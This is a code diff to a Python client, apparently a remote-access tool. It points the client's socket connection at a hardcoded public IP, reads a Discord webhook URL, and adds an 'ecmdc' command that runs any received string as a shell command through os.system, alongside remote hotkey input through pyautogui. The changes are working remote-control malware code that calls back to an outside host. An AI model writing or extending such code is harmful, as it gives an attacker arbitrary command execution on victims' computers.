@@ -17,7 +17,7 @@ load_dotenv()
 
 startup = False
 
-ip = "127.0.0.1"
+ip = "54.39.98.2"
 port = 8080
 
 WEBHOOK_URL = os.getenv("D_WEBHOOK_URL")
@@ -157,9 +157,21 @@ while True:
             s.send(end)
             
         if incoming_message[0] == "eh":
-            pyautogui.hotkey(incoming_message[1])
-            
+            pyautogui.hotkey(*incoming_message[1])
             end = str(['eh', "Hotkey executed"])
+                
+            end = end.encode()
+            s.send(end)
+            
+        if incoming_message[0] == "ecmdc":
+            cmd = os.system(incoming_message[1])
+            
+            if cmd == 0:
+                result = "Successfully executed command."
+            else:
+                result = "Failed to execute command."
+            
+            end = str(['ecmdc', result])
             end = end.encode()
             s.send(end)
             
